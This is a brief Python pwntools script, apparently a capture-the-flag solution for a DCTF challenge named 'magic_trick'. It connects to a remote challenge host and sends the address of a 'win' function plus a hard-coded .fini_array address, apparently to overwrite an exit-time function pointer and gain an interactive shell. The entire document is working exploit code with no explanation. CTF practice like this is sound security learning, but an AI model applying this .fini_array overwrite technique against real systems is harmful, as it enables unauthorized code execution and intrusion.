#!/usr/bin/env python3

from pwn import *

e = ELF("./magic_trick")

HOST = "dctf-chall-magic-trick.westeurope.azurecontainer.io"
PORT = 7481

fini_array = 6294016

conn = remote(HOST, PORT)

conn.sendline("{}\n{}".format(e.symbols["win"], fini_array))
conn.interactive()
